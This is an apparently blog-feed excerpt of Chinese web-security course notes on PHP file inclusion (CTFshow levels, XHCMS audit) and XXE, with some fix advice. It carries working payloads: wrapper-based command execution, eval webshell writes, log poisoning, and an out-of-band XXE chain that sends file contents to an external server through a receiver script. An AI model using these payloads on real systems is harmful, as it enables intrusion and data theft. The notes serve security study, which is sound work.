    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、文件操作类安全问题&lt;/p&gt;
&lt;p&gt;2、文件下载&amp;amp;删除&amp;amp;读取&lt;/p&gt;
&lt;p&gt;3、白盒&amp;amp;黑盒&amp;a</summary>
      
    
    
    
    <category term="Web攻防" scheme="http://example.com/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day42 WEB攻防-通用漏洞&amp;文件包含&amp;LFI&amp;RFI&amp;伪协议编码算法&amp;代码审计</title>
    <link href="http://example.com/2023/01/31/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>http://example.com/2023/01/31/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2023-01-31T04:14:41.000Z</published>
    <updated>2023-01-31T09:05:36.795Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、解释-什么是文件包含</p><p>2、分类-本地LFI&amp;远程RFI</p><p>3、利用-配合上传&amp;日志&amp;会话</p><p>4、利用-伪协议&amp;编码&amp;算法等</p><h3 id="核心知识："><a href="#核心知识：" class="headerlink" title="#核心知识："></a>#核心知识：</h3><h5 id="1、本地包含LFI-amp-远程包含RFI-区别"><a href="#1、本地包含LFI-amp-远程包含RFI-区别" class="headerlink" title="1、本地包含LFI&amp;远程包含RFI-区别"></a>1、本地包含LFI&amp;远程包含RFI-区别</h5><p>一个只能包含本地，一个可以远程加载</p><p>具体形成原因由代码和环境配置文件决定</p><h5 id="2、各类脚本语言包含代码写法-见下文"><a href="#2、各类脚本语言包含代码写法-见下文" class="headerlink" title="2、各类脚本语言包含代码写法-见下文"></a>2、各类脚本语言包含代码写法-见下文</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--#include file=&quot;1.asp&quot; --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--#include file=&quot;top.aspx&quot; --&gt;</span><br><span class="line"></span><br><span class="line">&lt;c:import url=&quot;http://thief.one/1.jsp&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;jsp:include page=&quot;head.jsp&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ include file=&quot;head.jsp&quot;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php Include(&#x27;test.php&#x27;)?&gt;</span><br></pre></td></tr></table></figure><h5 id="3、各类脚本语言包含伪协议玩法-见图"><a href="#3、各类脚本语言包含伪协议玩法-见图" class="headerlink" title="3、各类脚本语言包含伪协议玩法-见图"></a>3、各类脚本语言包含伪协议玩法-见图</h5><p><a href="https://www.cnblogs.com/endust/p/11804767.html">https://www.cnblogs.com/endust/p/11804767.html</a></p><h3 id="思路要点："><a href="#思路要点：" class="headerlink" title="#思路要点："></a>#思路要点：</h3><h5 id="黑盒发现："><a href="#黑盒发现：" class="headerlink" title="-黑盒发现："></a>-黑盒发现：</h5><blockquote><p>主要观察参数传递的数据和文件名是否对应</p></blockquote><h5 id="白盒发现："><a href="#白盒发现：" class="headerlink" title="-白盒发现："></a>-白盒发现：</h5><blockquote><p>1、可通过应用功能追踪代码定位审计</p><p>2、可通过脚本特定函数搜索定位审计</p><p>3、可通过伪协议玩法绕过相关修复等</p></blockquote><h3 id="本课总结："><a href="#本课总结：" class="headerlink" title="#本课总结："></a>#本课总结：</h3><p>1、有可控文件如能上传文件，配合上传后包含</p><p>2、无可控文件可以利用日志或Session&amp;伪协议</p><p>3、代码固定目录及文件后缀时需考虑版本绕过</p><p>4、伪协议玩法是建立在代码中只有变量存在时</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>​                ➢ 前置知识-原理&amp;分类&amp;探针&amp;利用&amp;修复</p><p>​                ➢ CTF应用-CTFSHOW-78关卡到117关卡</p><p>​                ➢ CMS源码-XHCMS-代码审计&amp;日志&amp;绕过</p><h5 id="前置知识-原理-amp-分类-amp-探针-amp-利用-amp-修复"><a href="#前置知识-原理-amp-分类-amp-探针-amp-利用-amp-修复" class="headerlink" title="#前置知识-原理&amp;分类&amp;探针&amp;利用&amp;修复"></a>#前置知识-原理&amp;分类&amp;探针&amp;利用&amp;修复</h5><p>实现过滤功能，是每个带代码段进行过滤编写，还是写一个过滤文件</p><p>1.每个需要过滤的地方，进行一次过滤的编写</p><p>2.每个需要过滤的地方，进行一次文件包含调用过滤函数</p><p>1.配合文件上传进行getshell，图片带有脚本后门代码，包含这个图片，脚本代码就被触发</p><p>2.配合日志文件进行getshell ，日志会记录访问UA信息，修改UA信息为后门代码，包含即执行后门代码</p><p>3.配合会话session进行getshell</p><p>文件包含</p><p>本地包含：LFI ：local file include</p><p>包含一个文件，这个文件有后门代码，就可以shell连上去</p><p>这个文件哪里来？</p><p><strong>三种思路：</strong></p><blockquote><p>1、可以通过文件上传获取，上传的文件在服务器上（上传任何后缀文件即可，因为会被include函数当作php执行）</p><p>2、没有文件上传，借助日志写入（UA），session文件写入</p><p>3、伪协议没有文件上传也能进行php代码执行，读文件，写文件（编码算法的转换）</p></blockquote><p>伪协议有条件：</p><p>（1）allow_url开关</p><p><img src="/../images/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230131142920202.png" alt="image-20230131142920202"></p><p>（2）利用伪协议php如果指定了包含目录，则不能解析</p><p><img src="/../images/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230131143116526.png" alt="image-20230131143116526"></p><p>要单纯的包含$file才行</p><p><img src="/../images/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230131143329641.png" alt="image-20230131143329641"></p><p>否则会报错：</p><p><img src="/../images/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230131143448962.png" alt="image-20230131143448962"></p><h4 id="CTF应用-CTFSHOW-78关卡到117关卡"><a href="#CTF应用-CTFSHOW-78关卡到117关卡" class="headerlink" title="#CTF应用-CTFSHOW-78关卡到117关卡"></a>#CTF应用-CTFSHOW-78关卡到117关卡</h4><h6 id="78-php-amp-http协议"><a href="#78-php-amp-http协议" class="headerlink" title="78-php&amp;http协议"></a>78-php&amp;http协议</h6><p>payload: ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>payload: ?file&#x3D;php:&#x2F;&#x2F;input post:<?php system('tac flag.php');?></p><p>payload: ?file&#x3D;<a href="http://www.xiaodi8.com/1.txt">http://www.xiaodi8.com/1.txt</a> 1.txt:<?php system('tac flag.php');?></p><h6 id="79-data-amp-http协议"><a href="#79-data-amp-http协议" class="headerlink" title="79-data&amp;http协议"></a>79-data&amp;http协议</h6><p>payload: ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system('tac flag.*');?></p><p>payload: ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D;</p><p>payload: ?file&#x3D;<a href="http://www.xiaodi8.com/1.txt">http://www.xiaodi8.com/1.txt</a> 1.txt:<?php system('tac flag.php');?></p><h6 id="80-81-日志包含"><a href="#80-81-日志包含" class="headerlink" title="80 81-日志包含"></a>80 81-日志包含</h6><p>1、利用其他协议,如file,zlib等</p><p>2、利用日志记录UA特性包含执行</p><p>分析需文件名及带有php关键字放弃</p><p>故利用日志记录UA信息，UA带入代码</p><p>包含：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><h6 id="82-86-SESSION包含"><a href="#82-86-SESSION包含" class="headerlink" title="82-86-SESSION包含"></a>82-86-SESSION包含</h6><p><a href="https://www.cnblogs.com/lnterpreter/p/14086164.html">https://www.cnblogs.com/lnterpreter/p/14086164.html</a></p><p><a href="https://www.cnblogs.com/echoDetected/p/13976405.html">https://www.cnblogs.com/echoDetected/p/13976405.html</a></p><h6 id="87-php-x2F-x2F-filter-x2F-write-amp-加密编码"><a href="#87-php-x2F-x2F-filter-x2F-write-amp-加密编码" class="headerlink" title="87-php:&#x2F;&#x2F;filter&#x2F;write&amp;加密编码"></a>87-php:&#x2F;&#x2F;filter&#x2F;write&amp;加密编码</h6><p>1、利用base64:</p><p>url编码2次：php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;123.php </p><p>content&#x3D;aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs&#x2F;Pg&#x3D;&#x3D;</p><p>编码两次的原因是浏览器会自动解码一次，第二次是因为有解码函数，所以要两次编码</p><p>2、利用凯撒13：</p><p>url编码2次：php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;2.php</p><p>content&#x3D;<?cuc riny($_CBFG[1]);?></p><h6 id="88-data-amp-base64协议"><a href="#88-data-amp-base64协议" class="headerlink" title="88-data&amp;base64协议"></a>88-data&amp;base64协议</h6><p>过滤PHP，各种符号，php代码编码写出无符号base64值</p><p>Payload：file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvIDEyMzs&#x2F;PmFk</p><h6 id="117-php-x2F-x2F-filter-x2F-write-amp-新的算法"><a href="#117-php-x2F-x2F-filter-x2F-write-amp-新的算法" class="headerlink" title="117-php:&#x2F;&#x2F;filter&#x2F;write&amp;新的算法"></a>117-php:&#x2F;&#x2F;filter&#x2F;write&amp;新的算法</h6><p>convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用</p><?php$result = iconv("UCS-2LE","UCS-2BE", '<?php eval($_POST[a]);?><p>‘);</p><p>echo “经过一次反转:”.$result.”\n”;</p><p>echo “经过第二次反转:”.iconv(“UCS-2LE”,”UCS-2BE”, $result);</p><p>?&gt;</p><p>Payload：file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;a.php</p><p>contents&#x3D;?&lt;hp pvela$(P_SO[T]a;)&gt;?</p><h5 id="CMS源码-XHCMS-代码审计-amp-日志-amp-绕过"><a href="#CMS源码-XHCMS-代码审计-amp-日志-amp-绕过" class="headerlink" title="#CMS源码-XHCMS-代码审计&amp;日志&amp;绕过"></a>#CMS源码-XHCMS-代码审计&amp;日志&amp;绕过</h5><p>1、搜索特定函数寻包含点</p><p>2、固定目录及后缀名需绕过</p><p>3、由CMS无上传用日志包含</p><p>4、利用长度绕过后缀名固定</p><p>Payload：<br>？r&#x3D;..&#x2F;..&#x2F;..&#x2F;Apache&#x2F;logs&#x2F;access.log&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;</p><p>搜include关键词</p><p><img src="/../images/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230131163709607.png" alt="image-20230131163709607"></p><p>在index文件里面找到</p><p><img src="/../images/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230131163832954.png" alt="image-20230131163832954"></p><p>已知利用伪协议不能固定目录，所以排除三种思路里面的这种绕过方法，且这个cms没有上传点，排除思路一，采用思路二（只有php低版本适用此payload）</p><p><img src="/../images/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230131165529965.png" alt="image-20230131165529965"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、解释-什么是文件包含&lt;/p&gt;
&lt;p&gt;2、分类-本地LFI&amp;amp;远程RFI&lt;/p&gt;
&lt;p&gt;3、利用-配合上传&amp;am</summary>
      
    
    
    
    <category term="Web攻防" scheme="http://example.com/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day41 xml&amp;xee&amp;无回显&amp;DTD实体&amp;伪协议&amp;代码审计</title>
    <link href="http://example.com/2023/01/18/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>http://example.com/2023/01/18/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2023-01-18T07:02:30.000Z</published>
    <updated>2023-01-30T12:54:59.108Z</updated>
    
    <content type="html"><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="#知识点:"></a>#知识点:</h2><h4 id="思路点："><a href="#思路点：" class="headerlink" title="#思路点："></a>#思路点：</h4><p>参考：<a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p><h3 id="XXE黑盒发现："><a href="#XXE黑盒发现：" class="headerlink" title="-XXE黑盒发现："></a>-XXE黑盒发现：</h3><blockquote><p>1、获取得到Content-Type或数据类型为xml时，尝试进行xml语言payload进行测试</p><p>2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe</p><p>3、XXE不仅在数据传输上可能存在漏洞，同样在文件上传引用插件解析或预览也会造成文件中的XXE Payload被执行</p></blockquote><h3 id="XXE白盒发现："><a href="#XXE白盒发现：" class="headerlink" title="-XXE白盒发现："></a>-XXE白盒发现：</h3><blockquote><p>1、可通过应用功能追踪代码定位审计</p><p>2、可通过脚本特定函数搜索定位审计</p><p>3、可通过伪协议玩法绕过相关修复等</p></blockquote><h5 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h5><p>XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XXE漏洞全称XML External Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p><h5 id="XML-与-HTML-的主要差异："><a href="#XML-与-HTML-的主要差异：" class="headerlink" title="XML 与 HTML 的主要差异："></a>XML 与 HTML 的主要差异：</h5><p>XML 被设计为传输和存储数据，其焦点是数据的内容。</p><p>HTML 被设计用来显示数据，其焦点是数据的外观。</p><p>HTML 旨在显示信息 ，而 XML 旨在传输信息。</p><h5 id="XXE修复防御方案："><a href="#XXE修复防御方案：" class="headerlink" title="XXE修复防御方案："></a>XXE修复防御方案：</h5><h6 id="方案1-禁用外部实体"><a href="#方案1-禁用外部实体" class="headerlink" title="-方案1-禁用外部实体"></a>-方案1-禁用外部实体</h6><p><code>PHP:</code></p><p><code>libxml_disable_entity_loader(true);</code></p><p><code>JAVA:</code></p><p><code>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</code></p><p><code>Python：</code></p><p><code>from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></p><h6 id="方案2-过滤用户提交的XML数据"><a href="#方案2-过滤用户提交的XML数据" class="headerlink" title="-方案2-过滤用户提交的XML数据"></a>-方案2-过滤用户提交的XML数据</h6><p>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</p><h1 id="案例演示-amp-复现"><a href="#案例演示-amp-复现" class="headerlink" title="#案例演示&amp;复现"></a>#案例演示&amp;复现</h1><p>➢ XML&amp;XXE-黑盒-原理&amp;探针&amp;利用&amp;玩法等</p><p>➢ XML&amp;XXE-前端-CTF&amp;Jarvisoj&amp;探针&amp;利用</p><p>➢ XML&amp;XXE-白盒-CMS&amp;PHPSHE&amp;无回显审计</p><h2 id="XML-amp-XXE-黑盒-原理-amp-探针-amp-利用-amp-玩法等"><a href="#XML-amp-XXE-黑盒-原理-amp-探针-amp-利用-amp-玩法等" class="headerlink" title="XML&amp;XXE-黑盒-原理&amp;探针&amp;利用&amp;玩法等"></a><strong>XML&amp;XXE-黑盒-原理&amp;探针&amp;利用&amp;玩法等</strong></h2><p>复现靶场：php_xxe</p><p>复现过程：</p><p>1.读取文件</p><p>访问php_xxe登录界面，随便输入账户名密码登录抓包</p><p><img src="/../images/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230130135004406.png" alt="image-20230130135004406"></p><p>抓包如下：<img src="/../images/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230130135140107.png" alt="image-20230130135140107"></p><p>可以看出accept类型为xml，尝试用xml注入读取文件：</p><p><img src="/../images/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230130140011820.png" alt="image-20230130140011820"></p><p>这里的&amp;test作为变量实现读取文件的功能，所以用户名那里要加上&amp;并保持变量名一致才可以实现，读到内容如下：</p><p><img src="/../images/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230130140155920.png" alt="image-20230130140155920"></p><p>2.带外测试</p><p>在注释掉回显result代码后内容不会再显示:</p><p><img src="/../images/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230130140424339.png" alt="image-20230130140424339"></p><p>采用带外测试：</p><p>构造语句测试判断有无漏洞：</p><p><img src="/../images/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230130140713597.png" alt="image-20230130140713597"></p><p>dnslog平台有回响，说明存在xml漏洞只是无回显</p><p><img src="/../images/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230130140638636.png" alt="image-20230130140638636"></p><p>所以采用解决方法如下：</p><p>外部引用实体dtd：</p><p>dtd是xml的一个实体文件，里面写的是xml的代码、</p><p>用来解决：1、拦截防护绕过问题</p><p>​    2、数据不回显的问题</p><p>实体引用：引用远程的evil2.dd文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;http://127.0.0.1:8081/evil2.dtd&quot;&gt;</span><br><span class="line">    %file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;Mikasa&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>evil2.dtd：读取d:&#x2F;e.txt内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY send SYSTEM &quot;file:///d:/e.txt&quot;&gt;</span><br></pre></td></tr></table></figure><p>这样，再有回显的情况下同样可以通过这种方法读取内容</p><p>若无回显：</p><p>构造数据包并发送，注意此处不能是&amp;test了，要是&amp;send才能实现远程访问读取，与test.dtd里面的send相对应</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///d:/e.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://47.94.236.117/test.dtd&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>自己的服务器47.94.236.117上面创建一个test的dtd文件内容入下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://47.94.236.117/get.php?file=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>以%file参数实现自己想要的功能，此处是实现文件读取</p><p>自己的服务器47.94.236.117创建get.php内容如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data=$_GET[&#x27;file&#x27;];</span><br><span class="line">$myfile = fopen(&quot;file.txt&quot;, &quot;w+&quot;);</span><br><span class="line">fwrite($myfile, $data);</span><br><span class="line">fclose($myfile);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>将读取到的内容写入file.txt</p><p><img src="/../images/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230130144922113.png" alt="image-20230130144922113"></p><p>（也就是说一共涉及有三个文件：get.php  test.dtd  file.txt）</p><p>其他协议玩法：<a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p><h2 id="XML-amp-XXE-前端-CTF-amp-Jarvisoj-amp-探针-amp-利用"><a href="#XML-amp-XXE-前端-CTF-amp-Jarvisoj-amp-探针-amp-利用" class="headerlink" title="XML&amp;XXE-前端-CTF&amp;Jarvisoj&amp;探针&amp;利用"></a>XML&amp;XXE-前端-CTF&amp;Jarvisoj&amp;探针&amp;利用</h2><p>流程：功能分析-前端提交-源码&amp;抓包-构造Paylod测试</p><p>ctf中的一题：<a href="http://web.jarvisoj.com:9882/">web.jarvisoj.com:9882</a></p><p>抓包后是json格式</p><p><img src="/../images/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230130150150776.png" alt="image-20230130150150776"></p><p>右击查看源代码，发现实际是xml的请求方式，XMLHttpRequest对象用于在后台与服务器交换数据</p><p><img src="/../images/Day41-xml-xee-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230130150314895.png" 